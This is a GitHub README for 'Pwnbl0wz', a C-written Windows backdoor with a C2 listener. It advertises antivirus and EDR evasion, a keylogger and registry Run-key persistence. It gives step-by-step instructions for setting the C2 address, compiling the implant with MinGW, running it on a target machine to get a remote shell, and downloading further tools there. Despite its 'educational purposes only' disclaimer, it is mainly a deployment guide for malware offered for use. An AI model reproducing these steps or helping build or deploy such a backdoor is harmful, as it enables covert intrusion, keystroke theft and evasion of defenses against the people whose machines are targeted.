# Pwnbl0wz

<p align="left">
  <a href="#Installation" target="_blank"><img alt="undefined" src="https://img.shields.io/badge/Installation-red?style=for-the-badge"></a>
  <a href="#Configuration" target="_blank"><img alt="undefined" src="https://img.shields.io/badge/Configuration-blue?style=for-the-badge"></a>
  <a href="#Usage" target="_blank"><img alt="undefined" src="https://img.shields.io/badge/Usage-green?style=for-the-badge"></a>
</p>

### EDUCATIONAL PURPOSES ONLY! I AM NOT RESPONSIBLE FOR ANY HARM CAUSED BY PWNBL0WZ
>Fully Undetectable Windows backdoor w/ C2 Listener written in 100% C
>This project is still in development by me, maybe soon enough if i have time ill finish it 100%
<br><br>
<img src="https://i.imgur.com/AeXvJQj.png"></img>


<br>

**Features:**
- 100% FUD (Win defender/Malwarebytes/Kaspersky)
- 100% FUD WITHOUT USING ENCRYPTION
- COULD BE XOR ENCRYTPED
- C2-Listener has encrypted datastream
- Backdoor Compatible with cryptcat
- EDR/Firewall Evasion
- Inbuild Keylogger 
- Persistence through HKEY_CURRENT_USER

 ``HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run``
 
 <br><br>
 
 #### Commands C2 server
| Command   | Description                                                                    |
| --------- | ------------------------------------------------------------------------------ |
| `hodlme`  | Creates Persistency through registry key                                       |
| `cd`      | Allows you to change directories in the buffer                                 |
| `startkey`| Activates a keylogger which logs every keystroke                               |
| `q`       | Close and quits session                                                        |
| `download`| Download file to client from HTTP Server (coming soon)                         |
| `cleanme` | Clears logs left behind of backdoor and deletes itself (coming soon)           |


<br><br>
> The C2 listener works only on linux machines since i use ``bzero();`` 
> but could be used on windows if u uncommented

> ``/* #define fuqbillgatez(p, size) (void) memset((p), 0, (size)) */`` i made, you would need to implement the fuqbillgatez function.
<br><br>
<br>

#### Installation (c2 server)

**Step 1**
``git clone https://github.com/EmirhanSarikaya/Pwnbl0wz.git``

**Step 2**
``cd Pwnbl0wz``

**Step 3**
>Configurate the C2 address and C2 port in the source code and set to specified IP addy

```
C2_addr.sin_addr.s_addr = inet_addr("1.3.3.7"); // ip-addy of C2 server
C2_addr.sin_port = htons(1337); // C2 server port listener
```
**Step 4**
Use gcc to compile the c2.c file.
``gcc c2.c -o c2``

<br><br><br>


#### Configuration (Pwnbl0wz backdoor)

**Step 1**
``cd Pwnbl0wz``

**Step 2**
>Configurate the C2_IP and C2_PORT in the sourcecode to the address of the C2 listener you've set earlier.

```
C2_IP = "1.3.3.7"; // c2 ip addy here
C2_port = 1337;    // c2 listener port
```

**Step 3**
>Now after you've set the IP addy and port for C2 you can compile using MINGW for 32-bit
>Reason we are compiling for 32-bit is so it can be executed on both 32/64-bit machines

``i686-w64-mingw32-gcc -o malwr.exe malwr.c -lwsock32 -lwininet``

**Now you are ready 2 rock! :)**

<br><br>


### Usage backdoor and C2-Listener

1) The C2-listener has some commands that i've coded like hodlme, download ect..
2) Open the malware.exe that you've compiled using MINGW on the target machine
3) You should get a connection on the C2 server, from this point on you can travel through the shell on the system
4) You could also execute commands like ``download https://x.com/plink.exe`` or other commands you like. 




<br><br>
# LEGAL DISCLAIMER
ME (EMIRHAN SARIKAYA) HAS NOTHING TO DO WITH WHAT HAPPENS USING THIS BACKDOOR, I JUST CREATED THIS FOR EDUCATIONAL PURPOSES ONLY AND WONT USE IT FOR MALICIOUS PURPOSES, THEREFORE ANY DAMAGE OR HARM CREATED BY PWNBL0WZ HAS NOTHING TO DO WITH ME. I AM NOT RESPONSIBLE AND DO NOT CONDONE THIS TOOL FOR MALICIOUS PURPOSES!
